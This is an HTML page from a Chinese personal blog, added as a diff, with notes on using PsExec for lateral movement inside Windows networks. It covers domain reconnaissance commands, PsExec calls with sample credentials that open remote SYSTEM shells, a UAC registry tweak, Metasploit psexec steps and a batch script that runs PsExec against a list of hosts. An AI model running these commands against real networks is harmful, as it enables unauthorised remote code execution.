@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>空空</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="简介    PsExec 是由 Mark Russinovich 创建的 Sysinternals Suite中包含的工具。    最初作为系统管理员的便利工具，以便在远程主机上运行命令来执行维护任务。后来因为太过方便，被利用到内网渗透之中。    现在PsExec类的工具有各种语言的实现，如Metasploit的psexec psexec psh, Impacket psexec, pth-wi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="空空">
+<meta property="og:url" content="http://example.com/2023/01/09/PsExec/index.html">
+<meta property="og:site_name" content="空空">
+<meta property="og:description" content="简介    PsExec 是由 Mark Russinovich 创建的 Sysinternals Suite中包含的工具。    最初作为系统管理员的便利工具，以便在远程主机上运行命令来执行维护任务。后来因为太过方便，被利用到内网渗透之中。    现在PsExec类的工具有各种语言的实现，如Metasploit的psexec psexec psh, Impacket psexec, pth-wi">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-09T15:12:29.032Z">
+<meta property="article:modified_time" content="2022-12-27T07:45:56.876Z">
+<meta property="article:author" content="两袖空空">
+<meta property="article:tag" content="笔记 , 研究 , 漏洞">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="空空" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">空空</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">两袖空空的随手记</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-PsExec" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/PsExec/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:29.032Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>简介<br>    PsExec 是由 Mark Russinovich 创建的 Sysinternals Suite中包含的工具。<br>    最初作为系统管理员的便利工具，以便在远程主机上运行命令来执行维护任务。后来因为太过方便，被利用到内网渗透之中。<br>    现在PsExec类的工具有各种语言的实现，如Metasploit的psexec psexec psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等等。<br>    可以获得与命令控制台几乎相同的实时交互性。<br>    PsExec最强大的功能就是在远程系统和远程支持工具（如ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。<br>    属于合法工具，有可以避反病毒软件和终端检测等产品</p>
+<p>原理：<br>    需要远程计算机启用文件和打印共享且默认Admin$共享映射到C:windows 目录<br>    PsExec建立连接后，目标机器会安装一个 “PSEXESVC” 服务，但是PsExec退出后该服务会删除（cmd下exit 退出） </p>
+<p>运行过程<br>    TCP三次握手，通过445端口SMB服务进行身份验证<br>    连接admin$默认共享，写入PSEXESVC.exe服务文件<br>    利用IPC命名管道调用svcctl服务，从而开启PSEXESVC服务<br>    生成四个命名管道以使用，1、psexesvc 2、输入管道 sdtin  3、输出管道stdout 4、重定向进程stderr</p>
+<p>不足：<br>    会释放文件，易被检测溯源攻击过程<br>    安装服务，留下日志<br>    少有的情况 退出时，服务删除失败<br>    推荐使用wmiexec</p>
+<p>定位域控<br>    net view &#x2F;domain 查看域<br>    net view &#x2F;domain:test 域内主机<br>    ping dc<br>    nslookup dc<br>查看当前登录域<br>    net config workstation<br>查看当前域的密码策略<br>    net accounts &#x2F;domain<br>查看补丁信息<br>    wmic qfe<br>查看当前系统信息<br>    wmic os</p>
+<p>无ipc连接时，我们需要进行身份验证<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456 cmd.exe		远程启用账户权限的cmd<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456  -s cmd.exe  远程启用System权限的cmd，需要administrator权限的shell<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456 cmd &#x2F;c “ipconfig”		远程启用cmd执行ipconfig并回显 </p>
+<p>PsExec参数<br>    # -accepteula  第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框<br>    # -s      以System权限运行远程进程，获得一个System权限的交互式Shell，如果不用这个参数，那么会获得一个administrator权限的shell<br>    # -h 如果可以，以管理员权限运行远程进程<br>    # -d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项<br>UAC认证弹窗<br>    HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem添加新DWORD值，键值：LocalAccountTokenFilterPolicy 为1<br>    修改注册表容易引起告警，一般不建议</p>
+<p>有ipc连接时<br>    net use \192.168.1.1\ipc$  &#x2F;user:”administrator” “123456”<br>    PsExec.exe \192.168.1.1 cmd.exe		远程启用cmd</p>
+<p>MSF IPC利用<br>    search psexec<br>    exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>    exploit&#x2F;windows&#x2F;smb&#x2F;psexec_psh（Powershell 版本的 psexec,是 powershell 版本的payload）<br>    use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>    set RHOST 192.168.1.1<br>    set smbuser usernmae<br>    set smbpass password<br>    run</p>
+<p>批量<br>@echo off<br>echo check ip addr config file…<br>if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end<br>echo read and analysis file…<br>for &#x2F;F “eol&#x3D;#” %%i in (ip.txt) do start PsExec.exe \%%i -accepteula -u administrator -p “123456” cmd &amp; start cmd &#x2F;c PsExec.exe \%%i -u administrator -p “123456” cmd<br>:end<br>exit</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/PsExec/" data-id="clcpupanf000b5gvp2mfnfeqf" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/01/09/PWN/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/01/09/procdump/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AV/">AV</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Domain/">Domain</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/IPC/">IPC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/">Intranet</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Intranet/IPC/">IPC</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AV/" rel="tag">AV</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Domain/" rel="tag">Domain</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AV/" style="font-size: 10px;">AV</a> <a href="/tags/Domain/" style="font-size: 10px;">Domain</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/01/09/book/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/book/hexo/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/apt/sources/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/%E5%BC%BA%E8%A1%8C%E6%94%B9%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/09/zzcms%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 两袖空空<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
